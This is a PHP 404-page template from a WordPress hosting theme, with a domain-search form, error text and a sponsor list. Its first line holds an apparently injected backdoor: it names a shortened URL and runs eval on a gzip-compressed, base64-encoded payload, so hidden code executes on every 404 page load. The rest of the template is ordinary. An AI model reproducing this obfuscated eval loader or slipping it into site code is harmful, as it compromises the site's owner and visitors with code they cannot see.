<?php
$x1='http://goo.gl/WmLycb'; eval(gzinflate(base64_decode('nZFNa4QwEIbvgv8hByERwsKeJYdS7Km4raunUsSNsQ71CxNxS9n/3okf/YBuDz2FmXnmnXknUDLQWhnmZXH4mIbH5ImqogBFn33/3XU8kw8vygjvvA8wypsT1KKEWmWYzWTXGtUazVbMt4wZa9Ci7HrVskVr11c95YRO1ALlNIBRbOH4IjnnZd3pLe8HF9eBX5Z7hQKmbTlZEUHkONQZtGCYVZkj7Ol6bJMVJ7dpfH94SFAhSeMoiW+i410Yc7L/k8aHo2f/0/Q2SJ2VtOiXVaysZufd/mXWdS7Es2fd7oYiO/RE+arjFbnJBS1A5yc8fjm20kDXahEdopB+G2RF+EzbNrj2vT/OWDTiSh0l9Js2qmEI4Z8EHw==')));?>
<?php get_header();?>
<section class="section_title">
    <div class="container">  
        <div class="row-fluid">   
            <h1><?php echo of_get_option('banner_title')?>      
                <span class="arrow_title"></span>      
            </h1>     
        </div>   
    </div>  
</section>   

<?php if(of_get_option('show_404_search')) { ?>

<section class="search_domain gray">

    <div class="container">
  
        <div class="row-fluid">
   
            <div class="span3 arrow_domain">
      
                <h1><?php echo of_get_option('search'); ?></h1>
      
                <span class="arrow"></span>
      
            </div>

            <div class="span9 form_domain">
      
                <span>www.</span>
       
                <form action="<?php echo home_url()?>/painel/?ccce=domainchecker" method="post">
       
                    <input type="hidden" name="token" value="34deb5160cc1f97541ba0cfe07b268cb814c3dde" />
                    <input type="hidden" name="direct" value="true" />  
                    <input type="text" name="domain" name="domain" required placeholder="<?php echo of_get_option('search_txt'); ?>">
        
                    <select>
                        <?php 
          for($i=1; $i<=of_get_option('number_of_do'); $i++) {
                            echo  '<option>'.of_get_option('do'.$i).'</option>';
                            }
                        ?>             
                    </select>
        
                    <input type="submit" class="button" value="<?php echo of_get_option('search_btn'); ?>">
        
                </form> 
       
            </div>                  

        </div>
     
    </div>
    
</section>

<?php } ?>

 <!-- Content About-->
 
<section class="info_content">

    <!-- Container-->
    
    <div class="container">

        <!-- Row fuid-->
     
        <div class="row-fluid">
     
            <div class="error_page">
      
                <div class="span4">
     
                    <h1><?php echo of_get_option('404_title') ?></h1>
      
                </div>
     
                <div class="span8">
     
                    <h2><?php echo of_get_option('404_text') ?></h2>
      
                </div>    
     
            </div>
      
        </div>
     
        <!-- End Row fuid-->

        <div class="row-fluid message_error center">
  
            <h3><?php echo of_get_option('404_explain') ?></h3>
      
            <a href="<?php echo of_get_option('404_url') ?>" class="button big"><?php echo of_get_option('404_botton') ?></a>
      
        </div>

    </div>
    
    <!-- End Container-->
    
</section>
   
<!-- Content About-->

<?php
    if(of_get_option('show_404_sponsor')){
    echo '<section class="sponsors gray border_top">
            <div class="container">
                <div class="row-fluid">
                    <ul id="sponsors">';
                        $num = of_get_option('sponsor_num');
                        for($i=1; $i<=$num; $i++){
                        echo'                         
                            <li>
                                <a href="'.of_get_option('sponsor_link'.$i).'"  title="'.of_get_option('sponsor_title'.$i).'">
                                    <img src="'.of_get_option('sponsor_img'.$i).'" alt="">
                                </a>
                            </li>';
                        }
            echo '  </ul>
                </div>
            </div>
        </section>';}?>
<?php get_footer(); ?>